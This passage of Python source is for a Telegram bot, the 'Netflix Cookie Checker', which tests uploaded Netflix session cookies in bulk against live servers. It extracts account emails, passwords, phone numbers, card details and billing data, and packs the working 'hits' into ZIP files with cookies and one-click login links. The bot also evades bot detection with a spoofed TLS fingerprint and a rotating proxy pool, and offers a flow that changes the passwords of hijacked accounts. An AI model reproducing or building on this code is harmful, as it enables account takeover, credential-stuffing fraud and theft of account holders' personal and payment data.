        wm = f"@{_BOT_USERNAME}" if _BOT_USERNAME else "Netflix Cookie Checker"
        lines += ["", thin, f"  {'Checked by ' + wm:^{W-2}}", sep, ""]
        return "\n".join(lines)

    # ── Build ZIP in memory ───────────────────────────────────────────────
    buf = io.BytesIO()
    total_hits = len(deduped)

    try:
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            # Summary file
            on_hold_count = sum(1 for r, _, _ in deduped if r.get("status") == "on_hold")
            W = 52
            summary_lines = [
                "╔" + "═" * W + "╗",
                f"║{'  NETFLIX HITS  —  ' + today:^{W}}║",
                "╠" + "═" * W + "╣",
                f"║{'':^{W}}║",
                f"║  Total Hits     :  {total_hits:<{W-20}}║",
                f"║  Premium Hits   :  {len(premium):<{W-20}}║",
                f"║  Normal Hits    :  {len(normal):<{W-20}}║",
                f"║  On Hold (incl.):  {on_hold_count:<{W-20}}║",
                f"║{'':^{W}}║",
            ]
            if dupes_removed > 0:
                summary_lines.append(f"║  Dupes Removed  :  {dupes_removed:<{W-20}}║")
            summary_lines += [
                "╚" + "═" * W + "╝",
                "",
                "Each account file contains:",
                "  • Full account details",
                "  • Cookie (Netscape format)",
                "  • One-click login link",
            ]
            zf.writestr("_SUMMARY.txt", "\n".join(summary_lines))

            # Premium Hits folder
            for i, (result, src, _) in enumerate(premium, 1):
                email   = result.get("email") or f"account_{i}"
                safe    = re.sub(r'[^\w@._-]', '_', email)[:35]
                plan    = re.sub(r'[^\w ]', '', result.get("plan_name") or "Premium")[:20].strip()
                c_flag  = _flag(result.get("country") or "")
                flag_pre = f"{c_flag}_" if c_flag else ""
                fname   = f"Premium Hits/{i:02d}_{flag_pre}{safe}_{plan}.txt"
                zf.writestr(fname, _account_file(i, len(premium), result, src))

            # Normal Hits folder
            for i, (result, src, _) in enumerate(normal, 1):
                email   = result.get("email") or f"account_{i}"
                safe    = re.sub(r'[^\w@._-]', '_', email)[:35]
                plan    = re.sub(r'[^\w ]', '', result.get("plan_name") or "Hit")[:20].strip()
                c_flag  = _flag(result.get("country") or "")
                flag_pre = f"{c_flag}_" if c_flag else ""
                fname   = f"Normal Hits/{i:02d}_{flag_pre}{safe}_{plan}.txt"
                zf.writestr(fname, _account_file(i, len(normal), result, src))

    except Exception as _zip_err:
        logger.exception("send_hits_zip: ZIP build failed")
        raise RuntimeError(f"ZIP build failed: {_zip_err}") from _zip_err

    buf.seek(0)
    rand2    = random.randint(10, 99)
    zip_name = f"Netflix-Hits-{total_hits}x-{rand2}.zip"

    caption_parts = [
        f"📦 <b>Netflix-Hits-{total_hits}x-{rand2}.zip</b>",
        "",
        f"  🌟 Premium Hits  »  <b>{len(premium)}</b>",
        f"  ✅ Normal Hits   »  <b>{len(normal)}</b>",
        f"  📊 Total         »  <b>{total_hits}</b>",
    ]
    if dupes_removed > 0:
        caption_parts.append(f"  ♻️ Dupes removed »  <b>{dupes_removed}</b>")
    caption_parts += [
        "",
        "📁 <b>ZIP structure:</b>",
        "  <code>Premium Hits/</code>  — Premium account files",
        "  <code>Normal Hits/</code>   — Standard / Basic / other files",
        "  <code>_SUMMARY.txt</code>   — Overview",
        "",
        "<i>Each file: full details · cookie · login link</i>",
    ]

    await update.message.reply_document(
        document=buf,
        filename=zip_name,
        caption="\n".join(caption_parts),
        parse_mode=ParseMode.HTML,
    )


# ---------------------------------------------------------------------------
# Commands
# ---------------------------------------------------------------------------

async def cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer("Cancelling…")
    try:
        msg_id = int(query.data.split(":")[1])
        _CANCEL_SESSIONS.add(msg_id)
    except Exception:
        pass


async def mode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Inline button: toggle full/basic mode."""
    query = update.callback_query
    try:
        user_id = int(query.data.split(":")[1])
        new_mode = _toggle_mode(user_id)
        await query.answer(f"Switched to {'Full' if new_mode == 'full' else 'Basic'} mode ✅")
    except Exception:
        await query.answer("Could not toggle mode.")


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user:
        stats_tracker.record_user(update.effective_user.id)
    await update.message.reply_text(
        "🎬 <b>Netflix Cookie Checker</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Send me a cookie file and I'll verify it <b>live</b> against Netflix's servers.\n\n"
        "📋 <b>What I extract from each account:</b>\n"
        "  📧 Email  ·  🔑 Password  ·  📱 Phone\n"
        "  📦 Plan   ·  🎬 Quality   ·  💰 Price\n"
        "  💳 Card   ·  🌍 Country   ·  🗓️ Billing date\n"
        "  👥 Profiles  ·  ✔️ Email verified  ·  📌 Hold status\n"
        "  🖥️ PC Login  ·  📱 Phone Login (one-click links)\n\n"
        "📦 <b>Bulk checks:</b>\n"
        "  Live progress bar → summary → ZIP of all hits\n"
        "  ZIP has <code>Premium Hits/</code> &amp; <code>Normal Hits/</code> folders\n"
        "  Each file: details · cookie · login link\n"
        "  Plus: 🏆 single best hit card sent after ZIP\n\n"
        "📁 <b>Supported formats:</b>\n"
        "  • <code>.txt</code>  — Netscape cookies\n"
        "  • <code>.txt</code>  — Pipe-combo: <code>email:pass | NetflixId=…</code>\n"
        "  • <code>.json</code> — JSON cookie export\n"
        "  • <code>.zip</code>  — Multiple files at once\n"
        "  • Paste raw cookie text directly in chat\n\n"
        "⚙️ <b>Default mode:</b> Basic (clean card)\n"
        "  /mode — switch modes  ·  /help — format guide",
        parse_mode=ParseMode.HTML,
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "📖 <b>Supported Cookie Formats</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>1. Netscape (.txt)</b>\n"
        "<code>.netflix.com  TRUE  /  TRUE  9999  NetflixId  ct%3D…</code>\n\n"
        "<b>2. Pipe-combo (.txt)</b>\n"
        "<code>email:pass | Country=IN | NetflixId=ct%3D…</code>\n\n"
        "<b>3. JSON (.json)</b>\n"
        '<code>[{"name":"NetflixId","value":"ct%3D…"}]</code>\n\n'
        "<b>4. ZIP (.zip)</b>\n"
        "Drop a ZIP — each <code>.txt</code> / <code>.json</code> inside = 1 account.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📦 <b>Bulk mode</b>\n"
        "Multi-account files → live progress bar → summary → ZIP.\n\n"
        "🗂 <b>ZIP structure (Netflix-Hits-{N}x-{##}.zip):</b>\n"
        "  📁 <code>Premium Hits/</code>  — one file per premium account\n"
        "  📁 <code>Normal Hits/</code>   — one file per other account\n"
        "  📄 <code>_SUMMARY.txt</code>   — total counts overview\n\n"
        "📄 <b>Each account file contains:</b>\n"
        "  • Full account details (plan, country, billing…)\n"
        "  • Cookie (Netscape format)\n"
        "  • One-click login link (PC + Mobile)\n\n"
        "🏆 <b>After ZIP:</b> single Best Hit card (top-ranked account)\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚙️ <b>All Commands</b>\n\n"
        "  /start      — Welcome &amp; overview\n"
        "  /help       — This message\n"
        "  /info       — Live stats &amp; bot info\n"
        "  /settings   — ⚙️ Output format &amp; delivery mode\n"
        "  /mode       — Toggle Basic ↔ Full Info\n"
        "  /basic      — Switch to Basic (compact) mode\n"
        "  /fullinfo   — Switch to Full Info mode\n"
        "  /changepw   — 🔐 [BETA] Change a Netflix account password\n"
        "  /cancel     — Cancel any active flow (e.g. /changepw)\n"
        "  /proxy      — 🛡 [Admin] Proxy pool manager\n"
        "  /setadmin   — 🔑 Claim admin role (first use only)",
        parse_mode=ParseMode.HTML,
    )


async def mode_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    current = _get_mode(uid)
    await update.message.reply_text(
        f"⚙️ <b>Output Mode</b>\n\n"
        f"Current: <b>{'Full Info' if current == 'full' else 'Basic'}</b>\n\n"
        "Choose your preferred mode:",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("📋 Full Info",  callback_data=f"setmode:{uid}:full"),
                InlineKeyboardButton("📄 Basic",      callback_data=f"setmode:{uid}:basic"),
            ]
        ]),
    )


async def setmode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    try:
        _, uid_str, new_mode = query.data.split(":")
        uid = int(uid_str)
        _USER_MODE[uid] = new_mode
        label = "Full Info" if new_mode == "full" else "Basic"
        await query.answer(f"Output format set to {label} ✅")
        await query.edit_message_text(
            _settings_text(uid),
            parse_mode=ParseMode.HTML,
            reply_markup=_settings_markup(uid),
        )
    except Exception:
        await query.answer("Error setting mode.")


async def fullinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    _USER_MODE[uid] = "full"
    await update.message.reply_text("✅ Output mode set to <b>Full Info</b>.", parse_mode=ParseMode.HTML)


async def basic_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else 0
    _USER_MODE[uid] = "basic"
    await update.message.reply_text("✅ Output mode set to <b>Basic</b>.", parse_mode=ParseMode.HTML)


async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show current settings with inline buttons to change output format and delivery mode."""
    uid = update.effective_user.id if update.effective_user else 0
    await update.message.reply_text(
        _settings_text(uid),
        parse_mode=ParseMode.HTML,
        reply_markup=_settings_markup(uid),
    )


async def setdelivery_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Inline button: set delivery mode (zip or cards)."""
    query = update.callback_query
    try:
        _, uid_str, new_delivery = query.data.split(":")
        uid = int(uid_str)
        _set_delivery(uid, new_delivery)
        label = "Card-by-Card 💬" if new_delivery == "cards" else "ZIP 📦"
        await query.answer(f"Delivery mode set to {label} ✅")
        await query.edit_message_text(
            _settings_text(uid),
            parse_mode=ParseMode.HTML,
            reply_markup=_settings_markup(uid),
        )
    except Exception:
        await query.answer("Error setting delivery mode.")


async def closesettings_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Close (delete) the settings panel message."""
    query = update.callback_query
    await query.answer()
    try:
        await query.message.delete()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Beta — Change Password helpers
# ---------------------------------------------------------------------------

def _extract_netflix_id(text: str) -> str:
    """
    Extract a raw NetflixId cookie value from various user inputs:
    - Full JSON cookie array (browser extension export)
    - 'NetflixId=ct%3D...' or '"NetflixId=ct%3D..."' string
    - Raw cookie value (ct%3D... or plain token)
    Returns the raw value string (URL-encoded, as Netflix expects it),
    or empty string if nothing useful found.
    """
    import json as _json

    raw = text.strip().strip('"').strip("'")

    # ── Try JSON array (browser extension cookie export) ──────────────────
    if raw.startswith("[") or raw.startswith("{"):
        try:
            data = _json.loads(raw)
            cookies = data if isinstance(data, list) else [data]
            for c in cookies:
                if isinstance(c, dict) and c.get("name") == "NetflixId":
                    return (c.get("value") or "").strip()
        except Exception:
            pass

    # ── Try 'NetflixId=value' format (with optional prefix junk) ─────────
    if "NetflixId=" in raw:
        after = raw.split("NetflixId=", 1)[1]
        # Stop at semicolons, quotes, newlines, spaces
        val = after.split(";")[0].split('"')[0].split("'")[0].split("\n")[0].split("\r")[0].strip()
        if val:
            return val

    # ── Raw cookie value — return as-is if it looks like a Netflix token ──
    # Netflix tokens start with ct%3D (URL-encoded 'ct=') or are long opaque strings
    if len(raw) >= 20 and "\n" not in raw and " " not in raw:
        return raw

    return ""


async def changepw_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """[BETA] Start an interactive flow to change a Netflix account's password."""
    uid = update.effective_user.id if update.effective_user else 0

    if uid in _CHANGEPW_STATE:
        _CHANGEPW_STATE.pop(uid, None)

    _CHANGEPW_STATE[uid] = {"step": "netflix_id"}

    await update.message.reply_text(
        "🔐 <b>Change Password</b>  <i>[BETA]</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚠️ <b>Warning:</b> This will permanently change the account's Netflix password.\n"
        "Only use this on accounts you own or have explicit permission to modify.\n\n"
        "Send /cancel at any time to abort.\n\n"
        "Step 1 of 3 — Enter the <b>NetflixId</b> cookie value for the account:\n"
        "<i>(the raw NetflixId string from the cookie)</i>",
        parse_mode=ParseMode.HTML,
    )


async def _handle_changepw_input(update: Update, uid: int, text: str) -> None:
    """Route text input through the Change Password state machine."""
    state = _CHANGEPW_STATE.get(uid)
    if not state:
        return

    step = state.get("step")

    # ── Cancel shortcut ───────────────────────────────────────────────────
    if text.strip().lower() in ("/cancel", "cancel"):
        _CHANGEPW_STATE.pop(uid, None)
        await update.message.reply_text(
            "❌ <b>Change Password cancelled.</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── Step 1: Collect NetflixId ─────────────────────────────────────────
    if step == "netflix_id":
        netflix_id = _extract_netflix_id(text)
        if not netflix_id or len(netflix_id) < 20:
            await update.message.reply_text(
                "⚠️ Could not find a valid NetflixId in what you sent.\n\n"
                "Please send <b>one</b> of these:\n"
                "• The raw <code>NetflixId</code> cookie value (starting with <code>ct%3D</code>)\n"
                "• A <code>NetflixId=ct%3D…</code> string\n"
                "• A full JSON cookie array exported from a browser extension\n\n"
                "Or send /cancel to abort.",
                parse_mode=ParseMode.HTML,
            )
            return
        state["netflix_id"] = netflix_id
        state["step"]       = "old_pw"
        await update.message.reply_text(
            "✅ NetflixId extracted.\n\n"
            "Step 2 of 3 — Send the account's <b>current password</b>:\n"
            "<i>Your message will NOT be stored after this step.</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── Step 2: Collect current password ─────────────────────────────────
    if step == "old_pw":
        if len(text.strip()) < 4:
            await update.message.reply_text(
                "⚠️ Password looks too short. Please try again or /cancel.",
                parse_mode=ParseMode.HTML,
            )
            return
        state["old_pw"] = text.strip()
        state["step"]   = "new_pw"
        await update.message.reply_text(
            "✅ Got it.\n\n"
            "Step 3 of 3 — Send the <b>new password</b> you want to set:\n"
            "<i>Must be at least 8 characters.</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── Step 3: Collect new password + confirmation ───────────────────────
    if step == "new_pw":
        new_pw = text.strip()
        if len(new_pw) < 8:
            await update.message.reply_text(
                "⚠️ New password must be at least 8 characters. Please try again or /cancel.",
                parse_mode=ParseMode.HTML,
            )
            return
        state["new_pw"] = new_pw
        state["step"]   = "confirm"
        await update.message.reply_text(
            f"🔒 <b>Confirm password change</b>\n\n"
            f"New password will be set to: <code>{new_pw}</code>\n\n"
            "Reply <b>YES</b> to confirm, or /cancel to abort.",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── Step 4: Confirm + execute ─────────────────────────────────────────
    if step == "confirm":
        if text.strip().upper() != "YES":
            await update.message.reply_text(
                "❌ Not confirmed. Send <b>YES</b> to proceed or /cancel to abort.",
                parse_mode=ParseMode.HTML,
            )
            return

        netflix_id = state.get("netflix_id", "")
        old_pw     = state.get("old_pw", "")
        new_pw     = state.get("new_pw", "")
        _CHANGEPW_STATE.pop(uid, None)

        status_msg = await update.message.reply_text(
            "⏳ <b>Changing password…</b>\n"
            "<i>Authenticating → Key exchange → Submitting…</i>",
            parse_mode=ParseMode.HTML,
        )

        loop = asyncio.get_event_loop()
        try:
            from password_changer import change_netflix_password
            result = await loop.run_in_executor(
                None,
                lambda: change_netflix_password(netflix_id, old_pw, new_pw),
            )
        except Exception as exc:
            logger.exception("change_netflix_password raised for uid %s", uid)
            await status_msg.edit_text(
                f"⚠️ <b>Unexpected error</b>\n<code>{exc}</code>",
                parse_mode=ParseMode.HTML,
            )
            return

        if result["success"]:
            await status_msg.edit_text(
                "✅ <b>Password Changed Successfully!</b>  <i>[BETA]</i>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🔑 New password: <code>{new_pw}</code>\n\n"
                "The old password no longer works.\n"
                "<i>Keep this safe — the bot does not store it.</i>",
                parse_mode=ParseMode.HTML,
            )
        else:
            await status_msg.edit_text(
                "❌ <b>Password Change Failed</b>  <i>[BETA]</i>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{result['message']}\n\n"
                "<i>Check that the NetflixId and current password are correct, "
                "then try again with /changepw</i>",
                parse_mode=ParseMode.HTML,
            )


async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show bot info, live stats, and quick command reference."""
    s   = stats_tracker.get_stats()
    uid = update.effective_user.id if update.effective_user else 0

    total_checks = s.get("total_checks", 0)
    hits         = s.get("total_hits", 0)
    invalids     = s.get("total_invalids", 0)
    errors       = s.get("total_errors", 0)
    frees        = s.get("total_frees", 0)
    on_hold      = s.get("total_on_hold", 0)
    users        = s.get("total_users", 0)
    uptime       = s.get("uptime", "—")
    hit_rate     = s.get("hit_rate", 0)
    cpm          = s.get("checks_per_min", 0)
    active       = len(_ACTIVE_USERS)
    mode_label     = "Full Info" if _get_mode(uid) == "full" else "Basic"
    delivery_label = "Card-by-Card 💬" if _get_delivery(uid) == "cards" else "ZIP 📦"

    await update.message.reply_text(
        "ℹ️ <b>Netflix Cookie Checker — Bot Info</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🤖 <b>About</b>\n"
        "  Validates Netflix cookies <b>live</b> against Netflix servers.\n"
        "  Uses Chrome124 TLS fingerprint to bypass bot detection.\n"
        "  Formats: Netscape, JSON, pipe-combo, hit-file, ZIP.\n\n"
        "📊 <b>Session Stats</b> <i>(since last restart)</i>\n"
        f"  ⏱️ Uptime          »  <b>{uptime}</b>\n"
        f"  📦 Total checked   »  <b>{total_checks}</b>\n"
        f"  ✅ Hits            »  <b>{hits}</b>  ({hit_rate}% hit rate)\n"
        f"  ⏸️ On Hold         »  <b>{on_hold}</b>\n"
        f"  🔓 Free accounts   »  <b>{frees}</b>\n"
        f"  ❌ Invalid/Expired »  <b>{invalids}</b>\n"
        f"  ⚠️ Errors          »  <b>{errors}</b>\n"
        f"  👤 Unique users    »  <b>{users}</b>\n"
        f"  🔄 Active checks   »  <b>{active}</b>\n"
        f"  🚀 Speed (last 60s)»  <b>{cpm} checks/min</b>\n\n"
        "⚙️ <b>Your Settings</b>\n"
        f"  Output mode:   <b>{mode_label}</b>\n"
        f"  Delivery mode: <b>{delivery_label}</b>\n\n"
        "📋 <b>Commands</b>\n"
        "  /start      — Welcome &amp; overview\n"
        "  /help       — Formats &amp; bulk mode guide\n"
        "  /info       — This page\n"
        "  /settings   — Output format &amp; delivery mode\n"
        "  /mode       — Toggle output mode\n"
        "  /basic      — Switch to Basic mode\n"
        "  /fullinfo   — Switch to Full Info mode\n"
        "  /cancel     — Cancel your active check",
        parse_mode=ParseMode.HTML,
    )


# ---------------------------------------------------------------------------
# Global error handler
# ---------------------------------------------------------------------------

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Catch-all handler — prevents unhandled exceptions from crashing the bot."""
    from telegram.error import (
        BadRequest, TimedOut, NetworkError,
        RetryAfter, Forbidden, Conflict, TelegramError,
    )
    err = context.error

    # Conflict: previous polling session still alive — auto-resolves in ~60s
    if isinstance(err, Conflict):
        logger.info("Telegram Conflict (old session still closing) — will auto-resolve")
        return
    # Rate limited
    if isinstance(err, RetryAfter):
        logger.warning("Telegram rate limit: retry after %ss", err.retry_after)
        return
    # Transient network errors
    if isinstance(err, (TimedOut, NetworkError)):
        logger.warning("Telegram network error: %s", err)
        return
    # Bot blocked by user
    if isinstance(err, Forbidden):
        logger.info("Bot blocked by user — ignoring")
        return
    # Bad request (e.g. message too long, can't edit, etc.)
    if isinstance(err, BadRequest):
        logger.warning("Telegram BadRequest: %s", err)
        return

    # Unexpected error — log it and notify the user if possible
    logger.error("Unhandled exception in handler: %s", err, exc_info=context.error)

    # Make sure the user's session lock is released
    if isinstance(update, Update) and update.effective_user:
        uid = update.effective_user.id
        _ACTIVE_USERS.pop(uid, None)
        _USER_SESSION.pop(uid, None)

    if isinstance(update, Update) and update.effective_message:
        try:
            await update.effective_message.reply_text(
                "⚠️ <b>Something went wrong.</b>\n\n"
                "Your session has been reset — please try again.\n"
                "If the problem keeps happening, try /start.",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass


# ---------------------------------------------------------------------------
# File & text handlers
# ---------------------------------------------------------------------------

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    doc: Document = update.message.document
    uid = update.effective_user.id if update.effective_user else None

    # ── Concurrency guard: one active check per user ───────────────────────
    if uid in _ACTIVE_USERS:
        await update.message.reply_text(
            "⏳ <b>You already have a check running.</b>\n"
            "Wait for it to finish or cancel it before starting a new one.",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── File size ──────────────────────────────────────────────────────────
    if doc.file_size and doc.file_size > 20 * 1024 * 1024:
        await update.message.reply_text(
            "⚠️ <b>File too large.</b> Maximum size is <b>20 MB</b>.\n"
            "Split your cookies into smaller batches.",
            parse_mode=ParseMode.HTML,
        )
        return

    mime = doc.mime_type or ""
    fname = (doc.file_name or "").lower()
    is_zip    = fname.endswith(".zip") or mime in ("application/zip", "application/x-zip-compressed")
    is_cookie = any(fname.endswith(ext) for ext in COOKIE_EXTENSIONS) or mime in COOKIE_MIME_TYPES

    # ── Extension / MIME guard ─────────────────────────────────────────────
    if not is_zip and not is_cookie:
        ext = Path(fname).suffix.upper() or "(no extension)"
        await update.message.reply_text(
            f"❌ <b>Unsupported file type: <code>{ext}</code></b>\n\n"
            "Accepted formats:\n"
            "  • <code>.txt</code>  — Netscape cookies or pipe-combo\n"
            "  • <code>.json</code> — JSON cookie export\n"
            "  • <code>.zip</code>  — Multiple cookie files\n\n"
            "<i>Send the actual cookie file, not a screenshot or archive.</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    if uid:
        _ACTIVE_USERS[uid] = time.time()

    status_msg = await update.message.reply_text("⏳ Downloading file…")
    suffix  = ".zip" if is_zip else (Path(fname).suffix or ".txt")
    tmp_path = None
    last_error = None

    # ── Download with retry ────────────────────────────────────────────────
    for attempt in range(3):
        try:
            if attempt > 0:
                await asyncio.sleep(2 * attempt)
                await status_msg.edit_text(f"⏳ Retrying download ({attempt + 1}/3)…")
            tg_file = await doc.get_file()
            with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tmp:
                await tg_file.download_to_drive(tmp.name)
                tmp_path = tmp.name
            break
        except Exception as e:
            last_error = e

    if tmp_path is None:
        await status_msg.edit_text(
            f"⚠️ <b>Download failed</b> after 3 attempts.\n"
            f"<i>Error: {last_error}</i>",
            parse_mode=ParseMode.HTML,
        )
        if uid:
            _ACTIVE_USERS.pop(uid, None)
        return

    original_name = doc.file_name or "unknown"

    try:
        if is_zip:
            await status_msg.edit_text("📦 Extracting ZIP…")
            try:
                entries = read_cookie_texts_from_zip(tmp_path)
            except zipfile.BadZipFile:
                await status_msg.edit_text(
                    "❌ <b>Corrupt or invalid ZIP file.</b>\n\n"
                    "The file could not be opened. Make sure it is a valid, unencrypted ZIP archive.",
                    parse_mode=ParseMode.HTML,
                )
                return
            except Exception as _e:
                await status_msg.edit_text(
                    f"❌ <b>ZIP extraction failed.</b>\n<i>{type(_e).__name__}: {_e}</i>",
                    parse_mode=ParseMode.HTML,
                )
                return
            finally:
                try:
                    os.unlink(tmp_path)
                except Exception:
                    pass

            if not entries:
                await status_msg.edit_text(
                    "⚠️ <b>No cookie files found in ZIP.</b>\n\n"
                    "Make sure the ZIP contains <code>.txt</code> or <code>.json</code> cookie files.",
                    parse_mode=ParseMode.HTML,
                )
                return

            # Validate that at least one file in the ZIP has Netflix cookies
            all_text = " ".join(t for _, t in entries)
            if not _has_netflix_markers(all_text):
                wrong = _wrong_service_name(all_text)
                if wrong:
                    msg = (
                        f"❌ <b>Wrong service: {wrong}</b>\n\n"
                        f"This ZIP contains <b>{wrong}</b> cookies, not Netflix.\n"
                        "Only Netflix cookies are supported."
                    )
                else:
                    msg = (
                        "❌ <b>No Netflix cookies found in this ZIP.</b>\n\n"
                        "Required: <code>NetflixId</code> or <code>SecureNetflixId</code> cookies."
                    )
                await status_msg.edit_text(msg, parse_mode=ParseMode.HTML)
                return

            all_sets: list[tuple[str, str, str]] = []
            for entry_fname, text in entries:
                for block in split_cookies_from_text(text):
                    all_sets.append((entry_fname, block, block))

            await process_cookie_sets(update, status_msg, all_sets)

        else:
            # ── Read & validate content before checking ────────────────────
            with open(tmp_path, "rb") as f:
                raw_bytes = f.read()
            try:
                os.unlink(tmp_path)
            except Exception:
                pass

            # Binary file check (images, executables, etc.)
            if _is_binary_content(raw_bytes):
                await status_msg.edit_text(
                    "❌ <b>Binary file detected.</b>\n\n"
                    "This looks like an image, executable, or compressed file — not a cookie file.\n"
                    "Send a plain-text <code>.txt</code> or <code>.json</code> cookie file.",
                    parse_mode=ParseMode.HTML,
                )
                return

            cookie_text = raw_bytes.decode("utf-8", errors="replace")
            ok, err_msg = _validate_cookie_text(cookie_text)
            if not ok:
                await status_msg.edit_text(err_msg, parse_mode=ParseMode.HTML)
                return

            await process_cookies(update, status_msg, cookie_text, source=original_name)

    except Exception as e:
        logger.exception("Error processing document from user %s", uid)
        try:
            if tmp_path:
                os.unlink(tmp_path)
        except Exception:
            pass
        try:
            await status_msg.edit_text(
                f"⚠️ <b>Processing error</b>\n<i>{type(e).__name__}: {e}</i>",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    finally:
        if uid:
            _ACTIVE_USERS.pop(uid, None)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Cancel any active interactive flow (e.g. /changepw, proxy add)."""
    uid = update.effective_user.id if update.effective_user else 0
    if uid in _CHANGEPW_STATE:
        _CHANGEPW_STATE.pop(uid, None)
        await update.message.reply_text(
            "❌ <b>Change Password cancelled.</b>",
            parse_mode=ParseMode.HTML,
        )
        return
    if uid in _PROXY_ADD_STATE:
        _PROXY_ADD_STATE.discard(uid)
        await update.message.reply_text("❌ Proxy add cancelled.")
        return
    if uid in _PROXY_SOURCE_STATE:
        _PROXY_SOURCE_STATE.discard(uid)
        await update.message.reply_text("❌ Import cancelled.")
        return
    await update.message.reply_text("Nothing to cancel.")


async def setadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Claim admin role (one-time, first caller wins)."""
    global _ADMIN_ID
    uid = update.effective_user.id if update.effective_user else None
    if uid is None:
        return
    if _ADMIN_ID is not None:
        if uid == _ADMIN_ID:
            await update.message.reply_text("✅ You are already the admin.")
        else:
            await update.message.reply_text("⛔ Admin is already set.")
        return
    _ADMIN_ID = uid
    _save_admin_id(uid)
    await update.message.reply_text(
        "✅ <b>You are now the bot admin.</b>\n\n"
        "Use /proxy to manage the proxy pool.",
        parse_mode=ParseMode.HTML,
    )


def _proxy_panel_text() -> str:
    from proxy_manager import proxy_manager as pm
    status = pm.status_text()
    sources = pm.list_sources()
    total = pm.count
    lines = ["🛡 <b>Proxy Manager</b>", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", ""]
    lines.append(f"Status: {status}")
    lines.append("")
    if total:
        lines.append(f"📦 <b>{total}</b> proxies stored  <i>(download list to view)</i>")
    else:
        lines.append("<i>No proxies stored yet.</i>")
    if sources:
        lines.append("")
        lines.append(f"<b>🔗 Auto-refresh Sources ({len(sources)}):</b>")
        for i, s in enumerate(sources):
            short = s[:55] + "…" if len(s) > 55 else s
            lines.append(f"  <code>{i+1}. {short}</code>")
        lines.append("")
        lines.append("<i>⏱ Sources auto-refresh every 60 s in background.</i>")
        lines.append("<i>☠️ Dead proxies are auto-removed immediately on rate-limit/timeout.</i>")
    lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    return "\n".join(lines)


def _proxy_panel_markup(pm) -> InlineKeyboardMarkup:
    toggle_label = "🔴 Turn OFF" if pm.enabled else "🟢 Turn ON"
    cpw_label = "🔴 Proxy ChangePW: OFF" if not pm.changepw_proxy_enabled else "🟢 Proxy ChangePW: ON"
    rows = [
        [
            InlineKeyboardButton(toggle_label,          callback_data="proxy:toggle"),
            InlineKeyboardButton("➕ Add Proxy",         callback_data="proxy:add"),
        ],
        [
            InlineKeyboardButton("📥 Add Source URL",   callback_data="proxy:importurl"),
            InlineKeyboardButton("🔄 Re-fetch Now",     callback_data="proxy:refreshsources"),
        ],
        [
            InlineKeyboardButton(cpw_label,             callback_data="proxy:togglechangepw"),
        ],
    ]
    if pm.count:
        rows.append([
            InlineKeyboardButton("📄 Download List",    callback_data="proxy:downloadlist"),
            InlineKeyboardButton("🗑 Clear All",        callback_data="proxy:clear"),
        ])
    sources = pm.list_sources()
    if sources:
        src_row = []
        for i in range(len(sources)):
            src_row.append(
                InlineKeyboardButton(f"🗑 Src#{i+1}", callback_data=f"proxy:delsource:{i}")
            )
            if len(src_row) == 4:
                rows.append(src_row)
                src_row = []
        if src_row:
            rows.append(src_row)
    rows.append([InlineKeyboardButton("🔄 Refresh Panel", callback_data="proxy:refresh")])
    return InlineKeyboardMarkup(rows)


async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin-only proxy management panel."""
    uid = update.effective_user.id if update.effective_user else 0
    if not is_admin(uid):
        await update.message.reply_text(
            "⛔ <b>Admin only.</b>\n\n"
            "Use /setadmin to claim the admin role first.",
            parse_mode=ParseMode.HTML,
        )
        return
    from proxy_manager import proxy_manager as pm
    await update.message.reply_text(
        _proxy_panel_text(),
        parse_mode=ParseMode.HTML,
        reply_markup=_proxy_panel_markup(pm),
    )


